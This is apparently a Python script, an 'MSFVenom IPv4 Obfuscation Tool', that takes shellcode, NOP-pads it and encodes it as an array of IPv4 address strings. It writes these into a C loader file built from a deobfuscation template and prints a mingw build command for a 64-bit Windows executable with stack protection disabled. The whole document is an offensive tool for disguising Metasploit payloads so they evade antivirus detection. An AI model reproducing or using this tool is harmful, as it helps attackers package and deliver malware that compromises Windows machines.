import socket
import struct
import argparse
import sys
import os

def generate_ipv4(a, b, c, d):
    return f"{a}.{b}.{c}.{d}"

def pad_shellcode(shellcode_bytes):
    while len(shellcode_bytes) % 4 != 0:
        shellcode_bytes += b'\x90'  # NOP padding
    return shellcode_bytes

def generate_ipv4_output(shellcode_bytes):
    ipv4_array = []
    for i in range(0, len(shellcode_bytes), 4):
        a, b, c, d = struct.unpack('<BBBB', shellcode_bytes[i:i+4])
        ipv4_array.append(generate_ipv4(a, b, c, d))
    return ipv4_array

def main():
    parser = argparse.ArgumentParser(description="MSFVenom IPv4 Obfuscation Tool")
    parser.add_argument("-o", "--output", help="Output C source file for IPv4 array and deobfuscation", required=True)
    args = parser.parse_args()

    shellcode_hex = sys.stdin.read().strip()
    shellcode_bytes = bytes.fromhex(shellcode_hex)
    shellcode_bytes = pad_shellcode(shellcode_bytes)

    ipv4_array = generate_ipv4_output(shellcode_bytes)

   
    with open(args.output, "w") as f:
        f.write("#define _WIN32_WINNT 0x0600\n")
        f.write("#include <winsock2.h>\n#include <windows.h>\n#include <ws2tcpip.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n")
        f.write(f"char* Ipv4Array[] = {{\n")
        for i, ip in enumerate(ipv4_array):
            f.write(f"    \"{ip}\"{',' if i < len(ipv4_array) - 1 else ''}\n")
        f.write("};\n\n#define NumberOfElements " + str(len(ipv4_array)) + "\n\n")
        f.write(open('deobfuscation_template.c').read())

    print("\nTo compile the generated C file for 64-bit Windows, use:\n")
#    print("x86_64-w64-mingw32-gcc -o output.exe "+ args.output +" -m64 -lws2_32")
    print("x86_64-w64-mingw32-gcc -o output.exe "+ args.output +" -m64 -lws2_32 -Wno-int-conversion -fno-stack-protector -fno-pie -nostdlib")

if __name__ == "__main__":
    main()

